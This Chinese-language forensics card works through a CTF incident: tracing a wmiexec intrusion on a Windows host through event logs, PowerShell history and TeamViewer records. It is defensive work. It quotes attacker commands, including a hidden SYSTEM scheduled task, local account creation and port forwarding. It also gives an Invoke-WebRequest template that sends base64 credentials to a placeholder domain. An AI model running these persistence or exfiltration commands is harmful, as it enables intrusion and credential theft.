---
id: defense-forensics-windows-evtx-psreadline-rmm-chain-reconstruction
title: Windows 主机入侵取证：Security.evtx 4624/4688 + PSReadLine + TeamViewer/known_hosts 还原 wmiexec 横向与持久化链
type: scenario
domain: defense
path: defense/forensics
technique: windows-evtx-psreadline-rmm-triage
tags:
- forensics
- incident-response
- windows
- evtx
- psreadline
- wmiexec
- teamviewer
- lateral-movement
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V217
  verified_at: '2026-11-07T04:33:20+08:00'
  notes: 已对照原文 The Enduring Echo 与图26-37/46-54核对：4624 来源 10.129.242.110、4688 父进程 WmiPrvSE.exe、SysHelper Update 计划任务（/sc minute /mo 2 /ru SYSTEM）、JM.ps1 建号 svc_netupd 与外带 NapoleonsBlackPearl.htb、known_hosts 192.168.1.101、portproxy 9999、TeamViewer James Moriarty 会话与 kdbx 凭据均与截图一致；与 19014 Windows 权限维持排查卡为不同数据源与取证链（dup-scan 判 related）。未验证点：CTF 环境，未在原始 evtx 上复跑 Get-WinEvent。
url: /docs/defense/forensics/defense-forensics-windows-evtx-psreadline-rmm-chain-reconstruction/
draft: false
kb_aliases:
- Windows 应急取证
- Security.evtx 溯源
- PSReadLine 历史命令取证
- WmiPrvSE 父进程 wmiexec
- TeamViewer Connections_incoming 取证
- known_hosts 横向线索
- 入侵时间线还原
---

## 一句话结论

拿到 Windows 主机的 `C:\Windows\System32\winevt\logs\Security.evtx`、用户目录与远程管理软件日志后，按“4624 登录来源 → 4688 进程创建及父进程 → PSReadLine 命令历史 → 计划任务/账户事件 → known_hosts/TeamViewer 连接日志 → 密码库”的顺序串联，可以还原出 wmiexec 入口、`SysHelper Update` 计划任务、`JM.ps1` 建号与凭据外带、netsh portproxy 转向以及 RMM 会话的完整攻击链。

## 原理

- **4624（登录成功）**：记录登录类型、目标用户与来源 IP。本例中用户 `Werni` 从 `10.129.242.110` 多次网络登录，排除本机后即可锁定攻击者来源。
- **4688（进程创建）+ 命令行审计**：进程名、PID、父进程与命令行。`WmiPrvSE.exe`（`wmiprvse.exe -secured -Embedding`）作为父进程派生出 `cmd.exe /Q /c ...` 是 `wmiexec.py` 远程执行 WMI 的典型特征；后续 `schtasks /create`、`net user`、`netsh interface portproxy` 都能在 4688 中直接读到完整命令。
- **PSReadLine 历史** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` 以明文保存用户输入过的 PowerShell 命令，可补充 evtx 中未开启命令行审计时缺失的操作（如 `net user Werni Quantum1! /add`、`reg add LocalAccountTokenFilterPolicy`、`Set-MpPreference`）。
- **账户生命周期事件**：4720（创建账户）、4722（启用）、4724（重置密码）、4738（账户属性变更）与 4688 中的 `net user`/`net localgroup` 对应，可确认攻击者建了哪个本地账号、加了哪些组。
- **计划任务持久化**：`schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f` 每 2 分钟以 SYSTEM 执行脚本，脚本负责建号、开 RDP 与凭据外带。
- **网络/横向线索**：`C:\Users\<user>\.ssh\known_hosts` 记录 SSH 连接过的内网主机（本例 `192.168.1.101`）；`netsh interface portproxy` 把本机 9999 转发到内网 22；`TeamViewer\Connections_incoming.txt` 记录 RMM 会话的账号、开始/结束时间与来源，TeamViewer 日志中的 `UDPv4: punch received a=192.168.69.213:55408` 可进一步给出对端内网 IP。
- **凭据库**：从受害机取得 KeePass `.kdbx` 后，用 hashcat 爆破主密码即可读出保存的账号口令（本例 `Werni:Quantum1!`），补全“被盗凭据 → 横向登录”的证据链。

## 触发条件

- 已获取主机 triage 镜像或可访问 `C:\Windows\System32\winevt\logs`、用户 Profile、Program Files 下远程管理软件目录。
- 系统开启了安全日志与进程创建审计（尤其是 `ProcessCreationIncludeCmdLine_Enabled=1`）；未开启时可用 PSReadLine/PowerShell 转录/计划任务 XML 补足。
- 攻击者在主机上留下了命令行操作、计划任务或远程管理连接记录；日志未被清空。

## 利用步骤

1. 用 Event Viewer/`wevtutil`/`Get-WinEvent` 打开 `Security.evtx`，先筛 4624，按来源 IP 与目标用户统计，锁定攻击者 IP（本例 `10.129.242.110`）。
2. 筛 4688，按时间排序；重点看父进程为 `WmiPrvSE.exe` 的 `cmd.exe /Q /c`（wmiexec 特征）、`schtasks.exe`、`powershell.exe`、`net.exe`、`netsh.exe`。
3. 读取 `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`，补齐明文命令与凭据（如 `net user ...`）。
4. 检查 `C:\Users\<user>\AppData\Local\*.ps1` 等脚本（本例 `JM.ps1`），确认建号、加管理员组、开 RDP 与外带 URL：
   `Invoke-WebRequest -Uri "http://<域名>/Exchange?data=<base64 user|password>"`。
5. 在 4688/4720/4722/4724/4738 中核对实际创建的账号（本例 `svc_netupd`）与密码修改时间。
6. 搜索 `netsh interface portproxy`、`known_hosts`、`TeamViewer\Connections_incoming.txt` 与 TeamViewer 日志，确定内网目标（`192.168.1.101`）、转发端口（9999）与 RMM 会话（James Moriarty，2025-08-20 09:58:25–10:14:27）。
7. 对找到的 KeePass `.kdbx` 做离线爆破，读取横向凭据；把以上时间点整理成攻击时间线。

## PoC

```powershell
# 4624 登录来源
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
  Select-Object TimeCreated, @{n='User';e={$_.Properties[5].Value}}, @{n='SrcIP';e={$_.Properties[18].Value}}

# 4688 命令行（重点看 WmiPrvSE 子进程、schtasks、netsh）
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  Where-Object { $_.Message -match 'wmiexec|schtasks|netsh|powershell|net user' } |
  Select-Object TimeCreated, Message
```

```text
# 关键文件路径
# C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# C:\Users\<user>\AppData\Local\JM.ps1
# C:\Users\<user>\.ssh\known_hosts
# C:\Program Files\TeamViewer\Connections_incoming.txt
# C:\Windows\System32\winevt\logs\Security.evtx
```

## 变体与关联

- 变体：没有命令行审计时，用 PowerShell Transcription、ScriptBlock 日志（4104）、Prefetch/Amcache、计划任务 XML 与用户目录脚本补足。
- 变体：远程执行工具换成 PsExec/WinRM/DCOM 时，父进程与 4688 特征不同，但“父进程异常 + 命令行 + 账户/计划任务事件”的关联方法一致。
- 关联：[[defense-forensics-windows-sid-correlation-timeline]]（用 SID/RID 串联 4624/4726/4688）；[[pentest-lateral-movement-psreadline-history-credential-harvest]]（PSReadLine 明文凭据）；[[defense-forensics-web-access-log-attacker-ip-triage]]（Web 入口侧日志溯源）。
- 边界：文章为 CTF 取证环境，部分答案来自作者对日志的解读；真实案件需结合 EDR、网络流量与内存镜像交叉验证。

## 检测与防御

- 检测：4688 中出现 `WmiPrvSE.exe` 派生的 `cmd.exe /Q /c`；`schtasks /create` 指向用户目录脚本；`net user`/`net localgroup Administrators`；`netsh interface portproxy`；RMM 日志出现陌生账号/来源；`known_hosts` 新增内网主机。
- 加固：启用进程创建命令行审计（`auditpol /set /subcategory:"Process Creation" /success:enable` 与 `ProcessCreationIncludeCmdLine_Enabled=1`），并集中收集 Security 日志；限制本地管理员与 WMI 远程调用；对计划任务、服务创建、portproxy 注册表变更做告警。
- 响应：隔离主机、重置相关账号与 RMM 凭据、检查已知横向目标、清理计划任务与本地账号、审计 RMM 会话；对 `.kdbx` 中的全部凭据做轮换。
